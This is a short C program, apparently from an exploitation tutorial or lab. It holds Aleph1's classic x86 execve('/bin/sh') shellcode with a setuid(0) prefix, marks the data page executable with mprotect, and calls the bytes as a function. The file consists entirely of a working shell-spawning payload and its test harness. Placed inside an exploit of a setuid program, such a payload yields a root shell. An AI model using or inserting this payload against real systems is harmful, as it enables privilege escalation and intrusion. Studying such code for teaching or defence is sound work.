#include <stdio.h>
#include <sys/mman.h>

const char shellcode[] =  //setuid(0) & Aleph1's famous shellcode, see ref.
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"      //setuid(0) first
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main() { //main function

    //The shellcode is on the .data segment,
    //we will use mprotect to make the page executable.
    mprotect(
        (void *)((int)shellcode & ~4095),
        4096,
        PROT_READ | PROT_WRITE | PROT_EXEC
    );

    //Convert the address of the shellcode variable to a function pointer,
    //allowing us to call it and execute the code.
    int (*ret)() = (int(*)())shellcode;
    return ret();
}

